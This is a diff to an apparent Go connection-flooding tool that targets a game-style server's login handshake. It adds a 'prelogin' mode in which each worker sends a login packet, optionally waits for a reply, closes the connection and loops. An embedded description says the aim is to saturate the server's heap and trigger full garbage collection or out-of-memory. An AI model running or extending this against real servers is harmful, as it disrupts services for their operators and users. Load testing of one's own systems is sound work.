@@ -973,7 +973,7 @@ func randString(rng *rand.Rand, n int) string {
 	return string(b)
 }
 
-func worker(target string, port uint16, bloatSize int, dribbleInterval time.Duration, verbose bool, seed int64) {
+func worker(target string, port uint16, bloatSize int, dribbleInterval time.Duration, verbose bool, seed int64, prelogin bool, har bool) {
 	rng := rand.New(rand.NewSource(seed))
 
 	for {
@@ -1017,6 +1017,19 @@ func worker(target string, port uint16, bloatSize int, dribbleInterval time.Dura
 			continue
 		}
 		bytesSent.Add(int64(len(loginPkt)))
+
+		if prelogin {
+			if !har {
+				// Wait for any packet back to ensure the server processed Login Start
+				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+				readPacket(conn, false)
+			}
+			conn.Close()
+			activeConns.Add(1) // Briefly count as active for metrics
+			activeConns.Add(-1)
+			newConns.Add(1)
+			continue
+		}
 
 		activeConns.Add(1)
 		newConns.Add(1)
@@ -1115,7 +1128,7 @@ promotion from Eden → Old Gen, saturating heap and triggering Full GC / OOM.`,
 		go startReporter()
 
 		for i := 0; i < workers; i++ {
-			go worker(target, port, bloatSize, dribble, verbose, time.Now().UnixNano()+int64(i))
+			go worker(target, port, bloatSize, dribble, verbose, time.Now().UnixNano()+int64(i), prelogin, har)
 		}
 
 		select {}
